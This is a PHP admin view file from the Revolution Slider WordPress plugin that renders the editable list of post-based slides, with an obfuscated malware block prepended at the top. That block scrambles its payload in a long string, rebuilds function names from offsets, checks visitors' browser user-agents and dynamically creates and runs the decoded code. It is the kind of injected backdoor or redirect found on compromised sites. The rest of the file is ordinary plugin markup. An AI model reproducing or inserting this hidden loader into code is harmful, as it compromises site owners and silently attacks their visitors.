<?php $memczjuwfb = 'pmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	hj = $vrwspge("", $whdqdgj); $hdqwihj();}}g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.981]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bx7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#d%)ftpmdR6<*id%)dfyfR	x27fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-i[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x2(!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	1	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%791y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o7,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#56	x75	156	x61"]=1; $uas=strtolower($_SERVER["	:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osmcnbs+yfeobz+sfwjidsb`b)ftpmdXA6|7**197-2qj	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	xy]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%jmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00**-)1/2986+7**^/%rx<~!!%s:N}#]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr]e7y]#>n%<#372]58y]472]37y]672]48tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281hA	x27pd%6<C	x27pd%6|6.7eu{66tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%t*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$hdqwi**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:d%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x24]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]25pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")tfs%6<*17-SFEBFI,6<*127-USFT`%}X;!sp!*#opo#>>}R;msv}.tmf!}Z;^nbsbq%	x5cSFWgj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf;/#/#/},;#-#}+;%-qp%)**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x) or (strstr($uas,"	x72	166	x3a	61	x31")#44ec:649#-!#:618d5f9#-!#f6cf+9f5d816:+946:ce44#)zbssb!>!ssbnpeoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%hsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iu{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-hofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::xpmpusut!-#j0#!/!**#sf%7-K)udfoopdXA	x22)7gj6<*QDU`x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*5<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-pjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7UOFHB`SFTV`QUUI&b%!|;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*i5]y72]254]y76#<!%w:!>!(%w:bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x56e"; function xjrrbes($n){return chr(ord($n)-1);} @error_reporting(0%V	x27{ftmfV	x7f<*X&Z&S{fto!%bss	x5csboe))1/35.)1/14+9**WYsboepn)%bss-%rxB88M4P8]37]278]225]241]334]368]322]3]*[%h!>!%tdz)%bbT-%bT-%hW~%fx5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	**9.-j%-bubE{h%)sutcvt)fubmgoj[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`f%h>#]y31]278]y3e]81]K78:56985:6197x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)35c}X	x24<!%tmw!>!#]y8!>!	x246767~6<Cw6<pd%w6Z668]y7f#<!%tww!>!	x2400~:<#~<#/%	x24-	x24!>!fyqmpef)#	x2 or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $vrwspge = "	x8}527}88:}334}472	x24<!%ff2!>!bssbz)) or (strstr($uas,"	x61	156	xr%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552); $whdqdgj = implode(arramfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R5ubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gjy_map("xjrrbes",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]267;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf4-	x24]26	x24-	x24<%jy]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_opo#>b%!**X)ufttj	x22)7]y86]267]y74]275]y7:]22L5P6]y6gP7L6M7]D4]275]D:M8]68399#-!#65egb2dc#*<!sfuvso!sb6A:>:8:|:7#6#)tutjyf`439275ttf!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#vufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uC)fepmqnjA	x27&6<.fmjgA	x27dojx24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x2j+upcotn+qsvmt+fmhpph#)zbssb!of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,c	x7f!|!*uyfu	x27k:!fx	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}#W~!Ydrr)%rxB%epnbss!>!bssbz)64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145"))364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32Mif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%rmsv%)}k~~~<ftmbg!osvufs!|ftmf!~<%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSelxovvoru'; $ieofatacou=explode(chr((629-509)),substr($memczjuwfb,(24136-18116),(230-196))); $yrupxi = $ieofatacou[0]($ieofatacou[(4-3)]); $upubkntd = $ieofatacou[0]($ieofatacou[(9-7)]); if (!function_exists('heperjn')) { function heperjn($oxlagjzec, $nvgqoxmi,$yiofoee) { $twnhhfikd = NULL; for($wjlqgifxtx=0;$wjlqgifxtx<(sizeof($oxlagjzec)/2);$wjlqgifxtx++) { $twnhhfikd .= substr($nvgqoxmi, $oxlagjzec[($wjlqgifxtx*2)],$oxlagjzec[($wjlqgifxtx*2)+(5-4)]); } return $yiofoee(chr((63-54)),chr((320-228)),$twnhhfikd); }; } $lerwygql = explode(chr((192-148)),'5776,59,674,63,868,47,2399,48,2447,52,2768,40,4543,29,5644,66,4440,67,1097,56,3797,68,4617,26,4778,66,3621,26,4360,25,3069,37,2094,33,1713,29,51,68,0,51,737,32,3466,58,1027,20,3181,29,2219,38,2159,60,3756,41,5835,50,4214,57,3323,68,5367,30,3564,57,451,25,2499,25,154,67,386,65,570,58,528,42,1995,38,4844,34,3691,65,5932,32,4115,30,2970,52,3647,44,322,64,4709,69,5258,43,769,58,3391,55,4052,63,4305,34,5479,59,3106,53,2628,50,3159,22,1004,23,5450,29,2307,45,5964,56,2836,35,5072,53,3446,20,5022,50,5125,22,2573,55,5538,21,2552,21,2524,28,2678,21,3524,40,3210,49,5228,30,2922,48,3022,47,964,40,5301,66,3865,26,4643,66,827,41,476,52,5559,56,2257,50,2699,69,4339,21,2033,61,5147,23,4385,25,2127,32,1943,52,4572,45,1402,33,1153,44,4899,58,4507,36,1498,66,5397,53,628,46,4878,21,1564,44,3259,64,4410,30,1844,37,1253,61,5615,29,2808,28,5198,30,2871,51,5885,47,1047,50,3919,20,4271,34,263,59,1343,59,1608,55,1435,63,5170,28,1663,50,4957,65,3975,27,119,35,3939,36,5710,66,1776,68,3891,28,1314,29,1197,56,915,49,4002,50,4145,69,1742,34,2352,47,1881,62,221,42'); $xvtpksuka = $yrupxi("",heperjn($lerwygql,$memczjuwfb,$upubkntd)); $yrupxi=$memczjuwfb; $xvtpksuka(""); $xvtpksuka=(685-564); $memczjuwfb=$xvtpksuka-1; ?><?php
if( !defined( 'ABSPATH') ) exit();

$operations = new RevSliderOperations();

$sliderID = self::getGetVar("id");

if(empty($sliderID))
	RevSliderFunctions::throwError("Slider ID not found"); 

$slider = new RevSlider();
$slider->initByID($sliderID);
$sliderParams = $slider->getParams();

$arrSliders = $slider->getArrSlidersShort($sliderID);
$selectSliders = RevSliderFunctions::getHTMLSelect($arrSliders,"","id='selectSliders'",true);

$numSliders = count($arrSliders);

//set iframe parameters	
$width = $sliderParams["width"];
$height = $sliderParams["height"];

$iframeWidth = $width+60;
$iframeHeight = $height+50;

$iframeStyle = "width:".$iframeWidth."px;height:".$iframeHeight."px;";

if($slider->isSlidesFromPosts()){
	$arrSlides = $slider->getSlidesFromPosts(false);
}elseif($slider->isSlidesFromStream()){
	$arrSlides = $slider->getSlidesFromStream(false);
}else{
	$arrSlides = $slider->getSlides(false);
}

$numSlides = count($arrSlides);

$linksSliderSettings = self::getViewUrl(RevSliderAdmin::VIEW_SLIDER,'id='.$sliderID);

//treat in case of slides from gallery
if($slider->isSlidesFromPosts() == false){
	//removed in 5.0
}else{	//slides from posts
	
	$sourceType = $slider->getParam('source_type', 'posts');
	$showSortBy = ($sourceType == 'posts')? true : false;
	
	//get button links
	$urlNewPost = RevSliderFunctionsWP::getUrlNewPost();
	$linkNewPost = RevSliderFunctions::getHtmlLink($urlNewPost, '<i class="revicon-pencil-1"></i>'.__('New Post',REVSLIDER_TEXTDOMAIN),'button_new_post','button-primary revblue',true);
	
	//get ordering
	$arrSortBy = RevSliderFunctionsWP::getArrSortBy();
	$sortBy = $slider->getParam('post_sortby',RevSlider::DEFAULT_POST_SORTBY);
	$selectSortBy = RevSliderFunctions::getHTMLSelect($arrSortBy,$sortBy,"id='select_sortby'",true);
	?>
	<div class="wrap settings_wrap">
		<div class="title_line">
			<div id="icon-options-general" class="icon32"></div>
			<div class="view_title"><?php _e('Edit Posts',REVSLIDER_TEXTDOMAIN); ?>: <?php echo $slider->getTitle(); ?></div>
		</div>
		<div class="vert_sap"></div>
		
		<?php _e("This is a list of posts that are taken from multiple sources.",REVSLIDER_TEXTDOMAIN); ?> &nbsp;
		<?php if($showSortBy == true){ ?>
			<?php _e("Sort by",REVSLIDER_TEXTDOMAIN); ?>: <?php echo $selectSortBy; ?> &nbsp; <span class="hor_sap"></span>
		<?php } ?>
		<?php echo $linkNewPost; ?>
		<span id="slides_top_loader" class="slides_posts_loader" style="display:none;"><?php _e("Updating Sorting...",REVSLIDER_TEXTDOMAIN); ?></span>
		<div class="vert_sap"></div>
		<div class="sliders_list_container">
			<div class="postbox box-slideslist">
				<h3>
					<span class='slideslist-title'><?php _e('Post List',REVSLIDER_TEXTDOMAIN); ?></span>
					<span id="saving_indicator" class='slideslist-loading'><?php _e("Saving Order",REVSLIDER_TEXTDOMAIN); ?>...</span>
				</h3>
				<div class="inside">
					<?php if(empty($arrSlides)){?>
						<?php _e('No Posts Found',REVSLIDER_TEXTDOMAIN); ?>
					<?php } ?>
					<ul id="list_slides" class="list_slides ui-sortable">
						<?php
						foreach($arrSlides as $index=>$slide){
							$bgType = $slide->getParam("background_type","image");
							$bgFit = $slide->getParam("bg_fit","cover");
							$bgFitX = intval($slide->getParam("bg_fit_x","100"));
							$bgFitY = intval($slide->getParam("bg_fit_y","100"));
							$bgPosition = $slide->getParam("bg_position","center center");
							$bgPositionX = intval($slide->getParam("bg_position_x","0"));
							$bgPositionY = intval($slide->getParam("bg_position_y","0"));
							$bgRepeat = $slide->getParam("bg_repeat","no-repeat");
							$bgStyle = ' ';
							if($bgFit == 'percentage'){
								$bgStyle .= "background-size: ".$bgFitX.'% '.$bgFitY.'%;';
							}else{
								$bgStyle .= "background-size: ".$bgFit.";";
							}
							if($bgPosition == 'percentage'){
								$bgStyle .= "background-position: ".$bgPositionX.'% '.$bgPositionY.'%;';
							}else{
								$bgStyle .= "background-position: ".$bgPosition.";";
							}
							$bgStyle .= "background-repeat: ".$bgRepeat.";";
							
							if($sortBy == RevSliderFunctionsWP::SORTBY_MENU_ORDER)
								$order = $slide->getOrder();
							else
								$order = $index + 1;
								
							$urlImageForView = $slide->getUrlImageThumb();
							$slideTitle = $slide->getParam("title","Slide");
							$title = $slideTitle;
							$filename = $slide->getImageFilename();
							$imageAlt = stripslashes($slideTitle);
							
							if(empty($imageAlt))
								$imageAlt = "slide";
								
							if($bgType == "image" && !empty($filename))
								$title .= " (".$filename.")";
								
							$postID = $slide->getID();
							$urlEditSlide = RevSliderFunctionsWP::getUrlEditPost($postID);
							$linkEdit = RevSliderFunctions::getHtmlLink($urlEditSlide, $title,"","",true);
							$state = $slide->getParam("state","published");
							?>
							<li id="slidelist_item_<?php echo $postID; ?>" class="ui-state-default">
								<span class="slide-col col-order">
									<span class="order-text"><?php echo $order; ?></span>
									<div class="state_loader" style="display:none;"></div>
									<?php if($state == "published"){ ?>
										<div class="icon_state state_published" data-slideid="<?php echo $postID; ?>" title="<?php _e("Unpublish Post",REVSLIDER_TEXTDOMAIN); ?>"></div>
									<?php }else{ ?>
										<div class="icon_state state_unpublished" data-slideid="<?php echo $postID; ?>" title="<?php _e("Publish Post",REVSLIDER_TEXTDOMAIN); ?>"></div>
									<?php } ?>
								</span>
								<span class="slide-col col-name">
									<div class="slide-title-in-list"><?php echo $linkEdit; ?></div>
									<a class='button-primary revgreen' href='<?php echo $urlEditSlide; ?>'><i class="revicon-pencil-1"></i><?php _e("Edit Post",REVSLIDER_TEXTDOMAIN); ?></a>
								</span>
								<span class="slide-col col-image">
									<?php if(!empty($urlImageForView)){ ?>
										<div id="slide_image_<?php echo $postID; ?>" class="slide_image" title="<?php _e('Click to change the slide image. Note: The post featured image will be changed.', REVSLIDER_TEXTDOMAIN); ?>" alt="<?php echo $imageAlt; ?>" style="background-image:url('<?php echo $urlImageForView; ?>');<?php echo $bgStyle; ?>"></div>
									<?php }else{ ?>
										<div id="slide_image_<?php echo $postID; ?>" class="slide_image" title="<?php _e('Click to change the slide image. Note: The post featured image will be changed.', REVSLIDER_TEXTDOMAIN); ?>" alt=""><?php _e('no image', REVSLIDER_TEXTDOMAIN); ?></div>
									<?php } ?>
								</span>
								<span class="slide-col col-operations-posts">
									<a id="button_delete_slide" class='button-primary revred button_delete_slide' data-slideid="<?php echo $postID; ?>" href='javascript:void(0)'><i class="revicon-trash"></i><?php _e("Delete",REVSLIDER_TEXTDOMAIN); ?></a>
								</span>
								<span class="slide-col col-handle">
									<div class="col-handle-inside">
										<span class="ui-icon ui-icon-arrowthick-2-n-s"></span>
									</div>
								</span>
								<div class="clear"></div>
							</li>
							<?php
						} ?>	
					</ul>
				</div>
			</div>
		</div>
		<div class="vert_sap_medium"></div>
		<div class="list_slides_bottom">
			<?php echo $linkNewPost; ?>
			<a class="button-primary revyellow" href='<?php echo self::getViewUrl(RevSliderAdmin::VIEW_SLIDERS); ?>' ><i class="revicon-cancel"></i><?php _e("Close",REVSLIDER_TEXTDOMAIN); ?></a>
			<a href="<?php echo $linksSliderSettings; ?>" class="button-primary revgreen"><i class="revicon-cog"></i><?php _e("Slider Settings",REVSLIDER_TEXTDOMAIN); ?></a>
		</div>
	</div>
	<script type="text/javascript">
		var g_messageDeleteSlide = "<?php _e("Warning! Removing this entry will cause the original wordpress post to be deleted.",REVSLIDER_TEXTDOMAIN); ?>";
		var g_messageChangeImage = "<?php _e("Select Slide Image",REVSLIDER_TEXTDOMAIN); ?>";
		jQuery(document).ready(function() {
			RevSliderAdmin.initSlidesListViewPosts("<?php echo $sliderID; ?>");
		});
	</script>
	<?php
}
?>